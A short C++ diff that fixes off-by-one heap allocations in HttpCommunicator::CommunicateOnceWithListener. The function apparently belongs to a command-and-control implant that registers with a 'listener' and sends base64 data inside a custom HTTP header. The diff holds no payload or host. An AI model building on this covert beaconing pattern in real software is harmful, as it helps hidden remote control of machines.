@@ -46,7 +46,7 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
 
     //// Prepare buffer for base64 encoded result of raw data
     DWORD bufferB64ToSendSize = (((this->communicateWithListenerDataSize + 2) / 3) * 4);
-    pBufferB64ToSend = this->pWinApiCustom->HeapAllocCustom(bufferB64ToSendSize);
+    pBufferB64ToSend = this->pWinApiCustom->HeapAllocCustom(bufferB64ToSendSize + 1);
 
     if (pBufferB64ToSend == NULL || bufferB64ToSendSize == 0)
         goto CLEANUP;
@@ -65,7 +65,7 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
         strHttpCommunicationHeaderName);
 
     DWORD communicationHeaderBufferSize = STRING_HTTP_COMMUNICATION_HEADER_LEN + 2 + bufferB64ToSendSize; // "HTTP-X-AUTH" + ": " + "BASE64_DATA"
-    communicationHeaderBuffer = this->pWinApiCustom->HeapAllocCustom(communicationHeaderBufferSize);
+    communicationHeaderBuffer = this->pWinApiCustom->HeapAllocCustom(communicationHeaderBufferSize + 1);
     if (communicationHeaderBuffer == NULL)
         goto CLEANUP;
 
